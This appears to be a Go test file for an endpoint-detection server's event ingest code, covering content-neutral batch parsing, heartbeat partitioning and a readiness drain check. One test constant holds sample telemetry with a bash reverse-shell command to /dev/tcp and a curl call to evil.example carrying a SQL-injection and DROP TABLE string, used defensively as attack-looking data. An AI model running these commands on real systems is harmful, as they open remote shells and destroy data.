package intake

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/fleetdm/edr/server/detection/api"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// attackSignatureBatch is a well-formed event batch whose payload fields are stuffed with the kind of strings a
// content-inspecting WAF matches on: a reverse-shell command line, a SQL-injection fragment, and a C2 beacon URL. It is the
// captured-telemetry shape that gets a managed PaaS edge to return 403 before the request reaches the server (the production
// incident behind the single-VM quickstart). The parser must treat it identically to any benign batch.
const attackSignatureBatch = `[` +
	`{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"exec",` +
	`"payload":{"path":"/bin/bash","args":["bash","-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}},` +
	`{"event_id":"e2","host_id":"host-a","timestamp_ns":1001,"event_type":"exec",` +
	`"payload":{"path":"/usr/bin/curl","args":["curl","http://evil.example/c2?q=1' OR '1'='1; DROP TABLE users;--"]}}` +
	`]`

// TestParseAndValidateIngestBody_ContentNeutral pins that the authenticated ingest parser decides acceptance on structure
// alone, never on what the events say. A batch whose contents resemble an attack parses to 200 exactly like a benign batch,
// and across the parser's whole error surface the status is never 403: content inspection belongs to no layer of a supported
// deployment, so a 403 can only come from an edge the operator should not have in the path. This is the server-side half of
// the WAF diagnosis that motivated docs/quickstart-vm.md.
func TestParseAndValidateIngestBody_ContentNeutral(t *testing.T) {
	t.Parallel()

	t.Run("spec:server-event-ingestion/ingest-acceptance-is-content-neutral/a-batch-whose-contents-resemble-an-attack-is-accepted", func(t *testing.T) {
		t.Parallel()
		benign := `[{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"exec",` +
			`"payload":{"path":"/usr/bin/true","args":["true"]}}]`

		benignEvents, benignStatus, benignErr := ParseAndValidateIngestBody([]byte(benign), "host-a")
		require.Equal(t, http.StatusOK, benignStatus, "benign batch must be accepted")
		require.Empty(t, benignErr)

		attackEvents, attackStatus, attackErr := ParseAndValidateIngestBody([]byte(attackSignatureBatch), "host-a")
		require.Equal(t, http.StatusOK, attackStatus, "attack-signature batch must be accepted identically to a benign one")
		require.Empty(t, attackErr, "the parser must not reject on payload content")
		assert.Len(t, attackEvents, 2)
		assert.Len(t, benignEvents, 1)
	})

	t.Run("spec:server-event-ingestion/ingest-acceptance-is-content-neutral/the-ingest-path-never-returns-a-content-block-status", func(t *testing.T) {
		t.Parallel()
		// Drive the parser across its full outcome surface: success, the attack-signature success, and each validation
		// failure. None of them may be 403; the only statuses the ingest path emits are 200, 400, and 413 (auth 401 lives
		// in the host-token middleware, which is likewise never 403, see hosttoken_test.go).
		cases := []struct {
			name string
			body string
		}{
			{"valid benign batch", `[{"event_id":"e1","host_id":"host-a","timestamp_ns":1,"event_type":"exec","payload":{}}]`},
			{"attack-signature batch", attackSignatureBatch},
			{"not JSON", `not json`},
			{"foreign host_id", `[{"event_id":"e1","host_id":"host-b","timestamp_ns":1,"event_type":"exec","payload":{}}]`},
			{"missing field", `[{"host_id":"host-a","timestamp_ns":1,"event_type":"exec","payload":{}}]`},
		}
		for _, tc := range cases {
			t.Run(tc.name, func(t *testing.T) {
				_, status, _ := ParseAndValidateIngestBody([]byte(tc.body), "host-a")
				assert.NotEqual(t, http.StatusForbidden, status, "ingest must never reject with a content-block 403")
				assert.Contains(t, []int{http.StatusOK, http.StatusBadRequest, http.StatusRequestEntityTooLarge}, status)
			})
		}
	})
}

// TestPartitionHeartbeats pins the ingest-time split that keeps snapshot_heartbeat events out of the persisted set while still
// surfacing their freshness bump (issue #408): the events to store exclude every heartbeat, and the returned bumps carry the PID +
// timestamp of each well-formed heartbeat. A heartbeat with an unparseable payload or a zero PID is dropped without a bump and
// without disturbing the batch.
func TestPartitionHeartbeats(t *testing.T) {
	t.Parallel()

	mk := func(id, typ string, ts int64, payload string) api.Event {
		return api.Event{EventID: id, HostID: "host-a", TimestampNs: ts, EventType: typ, Payload: json.RawMessage(payload)}
	}

	t.Run("spec:server-event-ingestion/liveness-heartbeats-are-processed-but-not-persisted/a-batch-mixing-heartbeats-and-real-events-persists-only-the-real-events", func(t *testing.T) {
		t.Parallel()
		events := []api.Event{
			mk("e1", "exec", 1000, `{"pid":42}`),
			mk("hb1", heartbeatEventType, 1001, `{"pid":100}`),
			mk("e2", "network_connect", 1002, `{"pid":42}`),
			mk("hb2", heartbeatEventType, 1003, `{"pid":200}`),
		}
		toStore, beats := partitionHeartbeats(events)
		require.Len(t, toStore, 2, "only the non-heartbeat events are persisted")
		assert.Equal(t, "e1", toStore[0].EventID)
		assert.Equal(t, "e2", toStore[1].EventID)
		require.Len(t, beats, 2, "each well-formed heartbeat yields one freshness bump")
		assert.Equal(t, 100, beats[0].PID)
		assert.Equal(t, int64(1001), beats[0].TimestampNs)
		assert.Equal(t, 200, beats[1].PID)
		assert.Equal(t, int64(1003), beats[1].TimestampNs)
	})

	t.Run("no heartbeats returns the input verbatim", func(t *testing.T) {
		t.Parallel()
		events := []api.Event{mk("e1", "exec", 1, `{"pid":1}`), mk("e2", "fork", 2, `{"child_pid":2}`)}
		toStore, beats := partitionHeartbeats(events)
		assert.Nil(t, beats)
		assert.Len(t, toStore, 2)
	})

	t.Run("an all-heartbeat batch persists nothing and yields a bump per heartbeat", func(t *testing.T) {
		t.Parallel()
		events := []api.Event{
			mk("hb1", heartbeatEventType, 1, `{"pid":11}`),
			mk("hb2", heartbeatEventType, 2, `{"pid":22}`),
		}
		toStore, beats := partitionHeartbeats(events)
		assert.Empty(t, toStore, "an all-heartbeat batch persists nothing (and allocates no toStore slice)")
		require.Len(t, beats, 2)
		assert.Equal(t, 11, beats[0].PID)
		assert.Equal(t, 22, beats[1].PID)
	})

	t.Run("malformed or zero-pid heartbeats are dropped without a bump", func(t *testing.T) {
		t.Parallel()
		events := []api.Event{
			mk("e1", "exec", 1, `{"pid":1}`),
			mk("hb-bad", heartbeatEventType, 2, `not json`),
			mk("hb-zero", heartbeatEventType, 3, `{"pid":0}`),
			mk("hb-ok", heartbeatEventType, 4, `{"pid":7}`),
		}
		toStore, beats := partitionHeartbeats(events)
		require.Len(t, toStore, 1, "no heartbeat is ever persisted, even a malformed one")
		assert.Equal(t, "e1", toStore[0].EventID)
		require.Len(t, beats, 1, "only the well-formed heartbeat produces a bump")
		assert.Equal(t, 7, beats[0].PID)
	})
}

// TestHandleReadyz_Draining pins that once the drain gate reports draining, /readyz returns 503 with status "draining" so a load
// balancer removes this replica from rotation. The store is nil here, which would otherwise make readyz report "degraded": the
// assertion on status="draining" proves the drain check takes precedence over the DB check (the contract the LB depends on).
func TestHandleReadyz_Draining(t *testing.T) {
	t.Run("spec:server-availability/sigterm-produces-a-load-balancer-drainable-graceful-shutdown/readiness-reports-not-ready-once-draining-begins", func(t *testing.T) {
		h := New(nil, nil, BuildInfo{})
		h.SetReadinessGate(func() bool { return true })

		mux := http.NewServeMux()
		h.RegisterHealthRoutes(mux)

		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/readyz", nil))

		require.Equal(t, http.StatusServiceUnavailable, rec.Code)
		var body struct {
			Status string `json:"status"`
		}
		require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body))
		assert.Equal(t, "draining", body.Status, "drain must take precedence over the DB check")
	})
}
